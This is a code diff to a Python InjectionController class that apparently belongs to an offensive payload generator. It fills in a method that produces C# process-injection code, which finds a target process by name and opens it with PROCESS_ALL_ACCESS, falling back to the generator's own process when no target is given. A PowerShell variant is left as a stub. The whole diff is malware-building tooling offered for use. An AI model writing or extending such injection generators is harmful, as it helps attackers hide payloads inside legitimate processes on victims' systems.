@@ -92,19 +92,50 @@ class InjectionController:
                 base_path = "C:\\\\Windows\\\\SysWOW64\\\\" if arch_key == "x86" else "C:\\\\Windows\\\\System32\\\\"
                 self.target_process_path = base_path + self.target_process
     
-    def get_windows_cs_injection_module(self):
-        """Create and return a module for Windows C# injection"""
+    
+    def get_windows_pwsh_injection_module(self):
+        """Create and return a module for Windows PWSH injection"""
         injection_module = Module()
         
         # IMPLEMENTATION HERE        
         
         return injection_module
 
-    def get_windows_pwsh_injection_module(self):
-        """Create and return a module for Windows PowerShell injection"""
+    def get_windows_cs_injection_module(self):
+        """Get injection code for C# templates"""
         injection_module = Module()
         
-        # IMPLEMENTATION HERE
+        # Add required imports first
+        injection_module.components = [
+            IncludeComponent("using System.Diagnostics;\nusing System.Linq;"),
+        ]
+
+        # Replace procInfo.hProcess with hProcess in template
+        if not self.target_process or self.target_process.lower() == "self":
+            injection_code = "IntPtr hProcess = Process.GetCurrentProcess().Handle;"
+        else:
+            # Remove .exe extension if present
+            process_name = self.target_process.lower().replace('.exe', '')
+            injection_code = f"""
+                // Get handle on remote process (by name)
+                string processName = "{process_name}";
+                Process[] pList = Process.GetProcessesByName(processName);
+                if (pList.Length == 0)
+                {{
+                    Console.WriteLine("[-] No such process");
+                    return;
+                }}
+                int processId = pList.First().Id;
+                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
+                if (hProcess == IntPtr.Zero)
+                {{
+                    Console.WriteLine("[-] Failed to open remote process");
+                    return;
+                }}
+            """
+
+        injection_component = InjectionComponent(injection_code)
+        injection_module.add_component(injection_component)
                 
         return injection_module
 
